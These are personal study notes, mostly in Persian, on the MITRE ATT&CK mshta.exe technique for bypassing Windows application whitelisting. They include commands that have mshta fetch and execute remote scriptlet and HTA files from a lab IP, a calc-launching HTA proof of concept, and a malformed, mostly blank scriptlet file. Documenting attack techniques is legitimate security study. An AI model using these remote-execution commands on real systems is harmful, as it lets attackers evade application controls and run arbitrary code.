https://attack.mitre.org/techniques/T1218/005/
ID: T1218.005

یکی دیگر از روش های bypass application white listing استفاده از یکی دیگر process های قانونیه خوده ویندوز است 
پروسه mshta یکی دیگر از پروسه های سیستمی ویندوز است که برای اجرای فایل های hta است یا همون html application طراحی شده است - یعنی فایل‌های HTML که می‌توانند JScript یا VBScript را خارج از مرورگر اجرا کنند. [MITRE ATT&CK+1](https://attack.mitre.org/techniques/T1218/005/?utm_source=chatgpt.com)
    
- مهاجمان از `mshta.exe` به‌عنوان یک **LOLBIN / living-off-the-land** برای پروکسی‌کردن اجرای اسکریپت (یا اجرای .hta از راه دور) استفاده می‌کنند، چون باینری قانونی معمولاً توسط مکانیزم‌های whitelisting مجاز است

main.sct
```
<?XML version="1.0"?>
<scriptlet>
                                                                                                                                                                                                                                                                                                                  
</script>
</scriptlet>
```

Invoking the scriptlet file hosted remotely:

```
# from powershell
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
```

![[Pasted image 20251108101622.png]]
mshta.exe http://10.0.0.5/m.hta

main.hta
```
<html>
<head>
<script language="VBScript"> 
    Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
    End Sub
RunProgram()
</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```